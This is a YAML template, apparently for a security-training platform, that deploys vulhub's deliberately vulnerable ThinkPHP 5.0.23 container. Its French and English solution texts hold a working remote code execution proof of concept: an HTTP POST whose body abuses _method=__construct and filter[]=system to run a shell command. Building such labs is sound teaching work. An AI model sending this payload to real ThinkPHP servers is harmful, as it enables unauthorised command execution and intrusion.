apiVersion: hivora/v1
kind: Template
metadata:
  slug: vulhub-thinkphp-5-0-23-rce
  name: ThinkPHP5 5.0.23 Remote Code Execution
  version: 1.0.0
  category: security-lab
  tags:
  - vulhub
  - thinkphp
  description: ThinkPHP — ThinkPHP5 5.0.23 Remote Code Execution (vulhub).
  links:
    site: https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
  maintainer: vulhub
  license: MIT (vulhub)
  source: https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
  lab:
    phase: exploitation
    cves: []
    os:
    - linux
    tech:
    - rce
    - thinkphp
    difficulty: medium
    summary: ThinkPHP5 5.0.23 Remote Code Execution
    solution:
      fr: |
        Adresse : IP:port affichés par le panel (les ports du guide sont ceux d'origine de vulhub), ou l'IP du lab sur le port d'origine via le VPN labo. Guide d'origine (anglais) : https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
        ThinkPHP is an extremely widely used PHP development framework in China. In its version 5.0(<5.0.24), while obtaining the request method, the framework processes it incorrectly, which allows an attacker to call any method of the Request class, resulting in a RCE vulnerability through a specific exploit chain.
        References：
        - https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003
        # Environment Setup
        Enter the following command：(ThinkPHP version: 5.0.23)
        $ docker compose up -d
        Visit `http://your-ip:8080` and you'll see the default page of ThinkPHP.
        # POC
        Send the packets and execute the command `id`:
        $ POST /index.php?s=captcha HTTP/1.1
        $ Host: localhost
        $ Accept-Encoding: gzip, deflate
        $ Accept: */*
        $ Accept-Language: en
        $ User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
        $ Connection: close
        $ Content-Type: application/x-www-form-urlencoded
        $ Content-Length: 72
        $ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
      en: |
        Address: the IP:port shown by the panel (the guide's ports are vulhub's original ones), or the lab's IP on the original port through the labs VPN. Original guide: https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
        ThinkPHP is an extremely widely used PHP development framework in China. In its version 5.0(<5.0.24), while obtaining the request method, the framework processes it incorrectly, which allows an attacker to call any method of the Request class, resulting in a RCE vulnerability through a specific exploit chain.
        References：
        - https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003
        # Environment Setup
        Enter the following command：(ThinkPHP version: 5.0.23)
        $ docker compose up -d
        Visit `http://your-ip:8080` and you'll see the default page of ThinkPHP.
        # POC
        Send the packets and execute the command `id`:
        $ POST /index.php?s=captcha HTTP/1.1
        $ Host: localhost
        $ Accept-Encoding: gzip, deflate
        $ Accept: */*
        $ Accept-Language: en
        $ User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
        $ Connection: close
        $ Content-Type: application/x-www-form-urlencoded
        $ Content-Length: 72
        $ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
requirements:
  arch:
  - amd64
form:
  basic:
  - id: port_80
    group:
      fr: Accès
      en: Access
    label: web 80/tcp
    type: port
    default: 8080
services:
  web:
    role: main
    image: vulhub/thinkphp
    tag: 5.0.23@sha256:ab1967a4fda3d9aff5a7e9479cb4ac5e19bf4246ae32b726a78d3a14c8a109c4
    frozen: true
    ports:
    - container: 80
      host: '{{ form.port_80 }}'
      protocol: tcp
      purpose: web
      exposure: lan
update:
  strategy: manual
access:
  web: http://{{ host.lan_ip }}:{{ form.port_80 }}
